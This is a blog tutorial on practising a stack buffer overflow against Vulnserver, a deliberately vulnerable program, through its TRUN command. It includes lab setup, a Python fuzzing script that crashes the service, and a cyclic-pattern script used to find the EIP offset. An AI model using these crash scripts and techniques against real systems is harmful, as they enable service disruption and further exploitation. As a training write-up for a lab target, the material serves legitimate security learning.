---
title: "Vulnserver - Stack Based Buffer Overflow"
date: 2020-01-19 
header:  
excerpt: "Vulnserver - Stack Based Buffer Overflow"
---

##  Intro

Vulnserver is an intentionally vulnerable software that can be found from [thegreycorner's blog](http://www.thegreycorner.com/p/vulnserver.html) or alternatively on their [GitHub](https://github.com/stephenbradshaw/vulnserver).

The software has multiple different Buffer Overflow vulnerabilities of which the Stack Based Buffer Overflow using the TRUN command is the simplest.

To practice exploiting the software we need the following
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Kali](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* [Mona.py](https://github.com/corelan/mona)
* Vulnserver
* Windows 10 (**32-Bit**)

## Setup

I will be using [VMware Workstation pro](https://my.vmware.com/en/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/15_0), you could alternatively use [VirtualBox](https://www.virtualbox.org/wiki/Downloads) which is free. Select the version  based on your operating system e.g. Windows.
After downloading the preferred Virtualization platform we need to create the two Virtual Machines Windows & Kali.

After creating the VMs, start up Windows VM and download vulnserver, immunity debugger & mona.

### Setting up Immunity Debugger

Download [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py), before you can download the site asks you to
fill the form, you can put random information in the fields.

![immu1](/images/vulnserver/stack/immu1.PNG)

Install Immunity Debugger and when the installer asks to install python 2.7.1 allow the installation.
After the installation is complete download [mona](https://github.com/corelan/mona) and copy the mona.py over to the
Pycommands folder inside Immunity Debugger. In this case **C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands**

![mona1](/images/vulnserver/stack/mona1.PNG)

You can now open Immunity Debugger by right clicking the shortcut and "run as administrator"

![immu2](/images/vulnserver/stack/immu2.PNG)

### Setting up Vulnserver

Download the Vulnserver software and extract it somewhere where it is easy to access such as the Desktop.

![vuln1](/images/vulnserver/stack/vuln1.PNG)

In the vulnserver folder there a few files, start the vulnserver.exe by right clicking it and "run as administrator"

![vuln2](/images/vulnserver/stack/vuln2.PNG)


You now have vulnserver up and running

![vuln3](/images/vulnserver/stack/vuln3.PNG)


## Exploiting TRUN Command

Now that we have basic setup done, we can start exploiting vulnserver via the TRUN command. First we can connect  to the
server using netcat, by default vulnserver listens on port 9999. Connect with **nc -v Windows VM IP 9999**, we can also list
the commands by issuing the command **HELP** after connecting.

![exp1](/images/vulnserver/stack/exp1.PNG)

First we create a fuzzing script with python that we can use to crash vulnserver. An example code could be something like

```python
#!/usr/bin/python
import sys, socket
from time import sleep

host = "192.168.209.133"
port = 9999

buffer = "A" * 100

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100

         except:
                 print "Fuzzing crashed at %s bytes" % str(len(buffer))
                 sys.exit()
```

After running the python code, we can check Immunity Debugger and in a few moments we can see that the program has crashed with
access violation and execution of the program is paused, which is good (note since I'm using Windows 10 older versions may act differently).

![exp2](/images/vulnserver/stack/exp2.PNG)

Looking at our fuzzing script we can see that the crash occured around 2400 bytes

![exp3](/images/vulnserver/stack/exp3.PNG)

Next we have to create an unique string to find the offset - or where the crash actually happened within the 2400 bytes using the pattern_create.rb tool included in the metasploit-framework,
**/usr/share/metasploit-framework/tools/exploit/pattern_create.rb** specify the length of the string the -l flag e.g. -l 2400

![exp4](/images/vulnserver/stack/exp4.PNG)

Next we edit the initial python script to include our pattern and send it to the server. The code should look something like

```python
#!/usr/bin/python
import sys, socket


host = "192.168.209.133"
port = 9999

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"

while True:
         try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                s.send(('TRUN /.:/' + offset))
                s.close()
                     
         except:
                 print "Unable to connect to the server"
                 sys.exit()
        
```

After executing the script, we can note that the server has crashed and we can see our EIP offset is 386F4337

![exp5](/images/vulnserver/stack/exp5.PNG)

Now that we have our EIP we can use another metasploit-framework tool named pattern_offset located at
**/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb** specify the same length as previously with
the -l flag e.g. -l 2400 and use the flag -q to include our EIP 386F4337 e.g. -g 386F4337

![exp6](/images/vulnserver/stack/exp6.PNG)

We have our offset at 2003 bytes.